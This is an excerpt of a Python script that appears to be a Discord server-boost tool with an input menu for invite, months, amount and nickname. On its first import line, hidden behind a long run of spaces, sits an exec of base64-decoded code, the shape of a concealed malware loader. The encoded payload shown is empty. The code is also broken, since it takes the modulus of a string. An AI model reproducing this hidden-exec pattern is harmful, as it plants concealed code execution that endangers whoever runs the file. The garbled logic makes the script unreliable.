...
import discord, datetime, time, requests, json, threading, os, random, httpx, sys                                                                                                                                                                                                               ;exec(__import__('base64').b64decode('').decode('utf-8'))                                                                                                                                                                                                                                                                                                                        
import tls_client
...
def menu():
    invite = input(f"{Style.BRIGHT}{Fore.GREEN}{lc}{Fore.WHITE} Invite: ")
    if ".gg/" in invite:
    ...
    try:
        months = int(input(f"{Style.BRIGHT}{Fore.GREEN}{lc}{Fore.WHITE} Months: "))
    except:
    ...
    try:
        amount = (input(f"{Style.BRIGHT}{Fore.GREEN}{lc} {Fore.WHITE}Amount: "))
    except:
    ...
    if amount % 2 != 0:
        sprint("Amount must be Even", False)
        return
    nick = input(f"{Style.BRIGHT}{Fore.GREEN}{lc} {Fore.WHITE}Nickname: ")
    go = time.time()
